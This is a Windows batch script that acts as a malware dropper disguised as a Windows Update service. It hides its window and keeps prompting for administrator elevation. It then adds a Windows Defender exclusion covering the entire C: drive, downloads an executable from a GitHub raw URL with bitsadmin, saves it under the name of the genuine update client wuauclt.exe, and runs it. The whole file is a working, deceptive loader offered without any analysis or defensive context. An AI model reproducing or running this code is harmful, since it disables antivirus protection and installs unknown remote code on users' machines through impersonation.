@echo off
if not "%1"=="MINIMIZED" (
    start "" /min cmd /c "%~f0" MINIMIZED %*
    exit /b
)

net session >nul 2>&1
if %errorLevel% == 0 (
    goto :runAsAdmin
) else (
    goto :requestElevation
)

:requestElevation
    set "originalPID="
    for /f "tokens=2 delims=;=" %%A in ('wmic process where "name='cmd.exe' and commandline like '%%%~nx0%%'" get processid^, commandline /format:list ^| find "MINIMIZED"') do (
        if not defined originalPID set "originalPID=%%A"
    )
    
    set "batchPath=%~f0"
    set "batchArgs=MINIMIZED KILLPARENT %originalPID%"
    
    :tryElevate
    echo Microsoft Windows Update Service...
    powershell -noprofile -windowstyle hidden -command "Start-Process -WindowStyle Hidden -FilePath 'cmd.exe' -ArgumentList '/min /c \"\"%batchPath%\" %batchArgs%\"' -Verb RunAs"
    if %errorLevel% == 0 (
        timeout /t 2 >nul
        exit
    ) else (
        timeout /t 1 >nul
        goto :tryElevate
    )

:runAsAdmin
    if /i "%~2"=="KILLPARENT" (
        taskkill /PID %~3 /F >nul 2>&1
    )
    
    setlocal
    set "ps1=%TEMP%\svc.ps1"
    echo Add-MpPreference -ExclusionPath 'C:\' > "%ps1%"
    powershell -NoProfile -ExecutionPolicy Bypass -File "%ps1%"
    del "%ps1%"
    timeout /t 2 >nul
    set "exeFile=%TEMP%\wuauclt.exe"
    set "url1=https://github.com/vault053009-maker/a/raw/refs/heads/main/VioletClient.exe"
    bitsadmin /transfer "Update" "%url1%" "%exeFile%"
    start "" "%exeFile%"
    endlocal
    exit